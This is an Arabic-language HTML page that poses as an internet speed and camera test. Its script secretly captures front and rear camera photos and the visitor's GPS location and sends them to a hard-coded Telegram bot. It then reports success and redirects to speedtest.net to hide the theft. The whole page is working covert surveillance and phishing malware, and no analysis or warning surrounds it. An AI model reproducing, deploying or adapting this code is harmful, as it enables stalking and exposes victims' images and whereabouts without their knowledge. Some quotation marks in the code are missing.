
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest - فحص جودة الاتصال</title>
    <style>
        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; margin: 0; }
        .circle { width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); }
        .speed { font-size: 45px; font-weight: bold; color: #00d2ff; }
        #status { margin-top: 25px; color: #888; font-size: 18px; }
        video, canvas { display: none; } 
    </style>
</head>
<body>
    <h1>Global Speed Test</h1>
    <p>اضغط GO لبدء فحص سرعة الإنترنت والكاميرا</p>
    <div class="circle" id="startBtn"><span class="speed">GO</span></div>
    <p id="status">بانتظار بدء الفحص...</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
        const chatId = "7984067238"; 

        async function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", blob, "image.jpg");
            formData.append("caption", caption);
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
        }

        async function capturePhoto(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingMode }, 
                    audio: false 
                });
                const video = document.getElementById( video );
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);
                await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار ثانية لضبط الفوكس

                const canvas = document.getElementById( canvas );
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext( 2d ).drawImage(video, 0, 0);
                
                stream.getTracks().forEach(track => track.stop());
                return new Promise(resolve => canvas.toBlob(resolve,  image/jpeg , 0.8));
            } catch (e) {
                console.error("خطأ في الكاميرا:", e);
                return null;
            }
        }

        async function startProcess() {
            document.getElementById( status ).innerText = "جاري طلب إذن الكاميرا للمعايرة...";
            
            // 1. طلب الكاميرا الأمامية أولاً
            const frontBlob = await capturePhoto("user");
            if (frontBlob) await sendPhoto(frontBlob, "📸 صورة أمامية");

            // 2. طلب الكاميرا الخلفية
            const backBlob = await capturePhoto("environment");
            if (backBlob) await sendPhoto(backBlob, "📸 صورة خلفية");

            // 3. طلب الموقع الجغرافي
            document.getElementById( status ).innerText = "جاري تحديد الموقع الجغرافي...";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 الموقع: " + mapLink)}`);
                    
                    alert("تم الفحص بنجاح!");
                    window.location.href = "https://www.speedtest.net";
                });
            }
        }

        document.getElementById( startBtn ).onclick = startProcess;
    </script>
</body>
</html>
